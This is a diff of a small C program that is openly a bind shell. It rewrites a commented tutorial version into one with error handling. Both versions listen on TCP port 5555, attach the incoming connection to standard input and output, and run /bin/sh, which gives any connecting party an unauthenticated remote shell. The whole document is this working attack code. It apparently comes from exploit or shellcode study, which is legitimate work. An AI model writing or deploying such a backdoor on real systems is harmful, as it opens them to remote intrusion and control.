@@ -1,32 +1,61 @@
+#include <unistd.h>
+#include <stdlib.h>
 #include <stdio.h>
+#include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <string.h>
 
-int main(void) {
+void main()
+{
+	int s;
 
-    //creating variable listen_sock which is returned by socket() as we need it for the bind(), listen(), and accept() calls 
-    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
+	if ((s=socket(AF_INET,SOCK_STREAM,0))==-1)
+	{
+		perror("[-] Error Creating Socket Descriptor\n");		
+		exit(-1);
+	}
 
-    // Building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
-    struct sockaddr_in server_addr;
-    server_addr.sin_family = AF_INET;           
-    server_addr.sin_addr.s_addr = INADDR_ANY;  
-    server_addr.sin_port = htons(5555);        
+	int optval=1;
+	if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1)
+	{
+		perror("[-] Error in setsockopt()\n");
+		exit(-3);
+	}
 
-    // Our second syscall, and perhaps the most complicated: bind() 
-    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+	struct addrinfo hints, *res;
+	memset(&hints, 0, sizeof hints);
 
-    //0 here is our specified backlog, (we dont have one)
-    listen(listen_sock, 0);
+	hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_flags = AI_PASSIVE;     // fill in my IP for me
+	getaddrinfo(NULL, "5555", &hints, &res);	
 
-    //creating new var conn_sock which is returned from accept() and needed for the dup2() call which duplicates this for stdin, stdout, and stderr
-    int conn_sock = accept(listen_sock, NULL, NULL);
+	if((bind(s,res->ai_addr,res->ai_addrlen))==-1)
+	{
+		perror("[+] Failed To Bind Port \n");
+		exit(-2);	
+	}
 
-    // Our fifth syscall, dup2(), is used 3 times
-    dup2(conn_sock, 0);
-    dup2(conn_sock, 1);
-    dup2(conn_sock, 2);
+	if(listen(s,5)== -1)
+	{
+		perror("[-] Could Not Listen\n");
+		exit(-4);
+	}
 
-    // Our final syscall is execve(), which runs a program fed to it as a string
+	int conn_fd;
+	conn_fd = accept(s, NULL, NULL);// accept(sock, (struct sockaddr *) &client_address, &client_length); can also be done but I dont want my IP to be known to the server	
+	if(conn_fd == -1)
+	{
+		perror("[-] Could Not Accept Connection\n");
+		exit(-5);
+	}	 
+
+    dup2(conn_fd, 0);
+    dup2(conn_fd, 1);
+    dup2(conn_fd, 2);
+
     execve("/bin/sh", NULL, NULL);
 }
